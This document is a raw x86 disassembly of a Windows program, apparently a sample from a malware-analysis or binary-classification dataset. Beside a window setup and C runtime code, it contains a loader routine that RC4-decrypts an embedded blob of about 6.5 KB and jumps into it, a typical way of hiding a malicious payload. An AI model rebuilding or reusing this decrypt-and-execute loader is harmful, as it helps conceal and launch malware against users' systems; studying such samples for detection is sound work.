sub_402ad0
loopne rwxdata
push 0x75
jae rwxdata
inc eax
add [ eax ] al
add [ eax ] al
add al ah
retn 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0xbc00000
rwxdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x4c00000 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x8c00000 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x8c00000 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x8c00000 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x8c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x8c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x8c00000 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ eax + eax - 0x10000 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
jns rwxdata
outsb
arpl [ cs : bx + di + 0x6e ] sp
rwxdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xbc00000 ] al
jne rwxdata
inc eax
add [ ecx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ bp + 0x65 ] 0x2e656d2e
popad
rwxdata
jns rwxdata
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aas
add [ cs : eax ] al
add [ ecx ] dh
insb
inc eax
add [ edx ] al
add [ eax ] al
add al bl
push ebx
inc eax
add al cl
push ebx
inc eax
add al ah
retn 0x40
sub_405770
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea eax [ ebp - 0x44 ]
xor esi esi
mov edi rwxdata
push eax
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x40 ] sub_40582e
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x44 ] 0x3
call [ RegisterClassA@IAT ]
push esi
push ebx
push esi
push esi
push 0x5
push 0x2
push esi
push esi
push 0x10000000
push rwxdata
push edi
push esi
call [ CreateWindowExA@IAT ]
mov edi eax
push 0x5
push edi
call [ ShowWindow@IAT ]
push 0x80
push 0x7
push 0x3
push esi
push esi
push 0xffffffff
push edi
call [ SetWindowPos@IAT ]
push edi
call [ UpdateWindow@IAT ]
mov edi [ GetMessageA@IAT ]
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x10
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push esi
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
jmp rwxdata
call edi
test eax eax
je rwxdata
sub_40582e
push ebp
mov ebp esp
sub esp 0x144
mov eax [ ebp + 0xc ]
dec eax
dec eax
je rwxdata
and [ ebp - 0x144 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x143 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x144 ]
push rwxdata
push eax
call sub_405a43
pop ecx
pop ecx
push 0x0
call [ PostQuitMessage@IAT ]
pop edi
sub eax 0x5
je rwxdata
call sub_4058e5
push 0x0
call [ ExitProcess@IAT ]
sub eax 0x8
je rwxdata
lea eax [ ebp - 0x40 ]
push eax
push [ ebp + 0x8 ]
call [ BeginPaint@IAT ]
push 0x80
push 0x9
push 0x9
push 0x0
push 0x0
push 0xffffffff
push [ ebp + 0x8 ]
call [ SetWindowPos@IAT ]
lea eax [ ebp - 0x40 ]
push eax
push [ ebp + 0x8 ]
call [ EndPaint@IAT ]
dec eax
je rwxdata
xor eax eax
sub eax 0xf2
je rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
jmp rwxdata
leave
retn 0x10
sub_4058e5
push ebx
push esi
mov ebx 0x193d
push edi
push ebx
mov edi rwxdata
push rwxdata
push edi
call sub_405aa0
push 0x9
mov esi rwxdata
push rwxdata
push esi
call sub_4059a5
push ebx
push edi
push esi
call sub_40592d
add esp 0x24
lea eax [ rwxdata ]
add eax 0x2
add eax 0x23
call eax
pop edi
pop esi
pop ebx
retn
sub_40592d
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
cmp [ ebp + 0x10 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jle rwxdata
leave
retn
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx 0x100
jmp rwxdata
inc eax
mov ecx ebx
cdq
idiv ecx
movzx eax [ edx + edi ]
add eax [ ebp - 0x8 ]
mov [ ebp + 0x8 ] edx
lea esi [ edx + edi ]
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
lea eax [ edx + edi ]
push eax
push esi
mov [ ebp - 0xc ] eax
call sub_405a30
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
pop ecx
movzx edx [ edx ]
pop ecx
mov ecx [ ebp - 0x4 ]
add ecx eax
movzx eax [ esi ]
add eax edx
mov esi ebx
cdq
idiv esi
mov al [ edx + edi ]
xor [ ecx ] al
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jl rwxdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
sub_4059a5
push ebp
mov ebp esp
sub esp 0x404
and [ ebp - 0x404 ] 0x0
push ebx
push esi
push edi
mov ecx 0xff
xor eax eax
and [ ebp - 0x4 ] eax
lea edi [ ebp - 0x400 ]
[ edi ]
mov edi [ ebp + 0x8 ]
xor ecx ecx
lea ebx [ ebp - 0x404 ]
mov esi 0x100
mov eax ecx
mov [ ecx + edi ] cl
cdq
idiv [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
inc ecx
movzx eax [ edx + eax ]
mov [ ebx ] eax
add ebx 0x4
cmp ecx esi
jl rwxdata
mov [ ebp + 0x8 ] edi
lea ebx [ ebp - 0x404 ]
mov [ ebp + 0x10 ] esi
mov eax [ ebp + 0x8 ]
mov ecx esi
movzx eax [ eax ]
add eax [ ebx ]
add eax [ ebp - 0x4 ]
cdq
idiv ecx
mov [ ebp - 0x4 ] edx
add edx edi
push edx
push [ ebp + 0x8 ]
call sub_405a30
add ebx 0x4
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
pop ecx
pop ecx
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
sub_405a43
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_40607f
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js rwxdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_405f6a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp rwxdata
mov eax esi
pop esi
leave
retn
sub_405aa0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe rwxdata
test edi 0x3
jne rwxdata
cmp edi eax
jb rwxdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne rwxdata
jmp [ ecx * 4 + rwxdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_405b00 ]
jmp [ ecx * 4 + jump_table_405b7c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405be8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405be8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_405d80 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_405c88 ]
neg ecx
jmp [ ecx * 4 + rwxdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405d80 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405be8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405be8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405be8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405d80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405d80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405d80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405d80 ]
sub_405dd5
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je rwxdata
test al 0x83
je rwxdata
or eax 0xffffffff
jmp rwxdata
mov eax edi
push esi
call sub_406a68
push esi
mov edi eax
call sub_406a02
push [ esi + 0x10 ]
call sub_40694f
add esp 0xc
test eax eax
jge rwxdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je rwxdata
or edi 0xffffffff
jmp rwxdata
push eax
call sub_4068e6
and [ esi + 0x1c ] 0x0
pop ecx
_start
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rwxdata ] edx
mov ecx eax
and ecx 0xff
mov [ rwxdata ] ecx
shl ecx 0x8
add ecx edx
mov [ rwxdata ] ecx
shr eax 0x10
mov [ rwxdata ] eax
xor esi esi
push esi
call sub_407629
pop ecx
test eax eax
jne rwxdata
mov [ ebp - 0x4 ] esi
call sub_407309
call [ GetCommandLineA@IAT ]
mov [ rwxdata ] eax
call sub_4071d7
mov [ rwxdata ] eax
call sub_406f8a
call sub_406ed1
call sub_406bf3
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_406e79
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je rwxdata
push 0x1c
call sub_405f46
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_405770
mov [ ebp - 0x60 ] eax
push eax
call sub_406c20
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_406cf5
pop ecx
pop ecx
retn
sub_405f6a
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je rwxdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne rwxdata
test al 0x1
je rwxdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne rwxdata
and [ esi + 0x4 ] 0x0
test al 0x10
je rwxdata
test [ esi + 0xc ] 0x108
push edi
je rwxdata
cmp esi rwxdata
je rwxdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_407a7e
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle rwxdata
push ebx
call sub_407c6f
test eax eax
pop ecx
jne rwxdata
cmp esi rwxdata
jne rwxdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp rwxdata
or [ esi + 0xc ] 0x20
jmp rwxdata
cmp ebx 0xffffffff
je rwxdata
push edi
push eax
push ebx
call sub_407a7e
add esp 0xc
mov [ ebp + 0xc ] eax
jmp rwxdata
push esi
call sub_407c2b
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rwxdata
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx * 8 ]
jmp rwxdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp rwxdata
push 0x2
push 0x0
push ebx
call sub_4079e4
add esp 0xc
test [ eax + 0x4 ] 0x20
je rwxdata
cmp [ ebp + 0xc ] edi
pop edi
je rwxdata
sub_40607f
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ecx ecx
push edi
mov [ ebp - 0x10 ] ecx
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp + 0xc ] esi
je rwxdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x800
mov edx 0x200
jmp rwxdata
cmp [ ebp - 0x14 ] 0x0
jl rwxdata
cmp bl 0x20
jl rwxdata
xor eax eax
cmp bl 0x78
jg rwxdata
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp + 0xc ] esi
jne rwxdata
jmp [ eax * 4 + jump_table_4067fd ]
movsx eax bl
mov al [ eax + rwxdata ]
and eax 0xf
jmp rwxdata
mov ecx [ ebp - 0x3c ]
mov edx 0x200
mov edi 0x800
xor eax eax
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] eax
